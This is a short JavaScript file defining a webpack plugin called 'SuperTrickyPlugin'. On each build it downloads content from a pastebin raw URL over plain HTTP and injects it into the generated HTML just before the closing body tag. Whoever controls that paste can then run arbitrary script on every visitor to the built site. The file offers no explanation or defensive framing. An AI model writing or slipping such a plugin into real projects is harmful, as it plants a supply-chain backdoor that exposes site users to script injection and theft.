const http = require('http')

class SuperTrickyPlugin {
  apply (compiler) {
    compiler.plugin('compilation', (compilation) => {
      compilation.plugin('html-webpack-plugin-after-html-processing', (htmlPluginData, callback) => {
        let { html } = htmlPluginData
        http.get('http://pastebin.com/raw/YHfZeWq6')
          .on('response', response => {
            let body = '';
            response.on('data', chunk => body += chunk)
            response.on('end', () => {
              html = html.replace('</body>', `${body}</body>`)
              callback(null, { html })
            })
          })
      })
    })
  }
}

module.exports = SuperTrickyPlugin
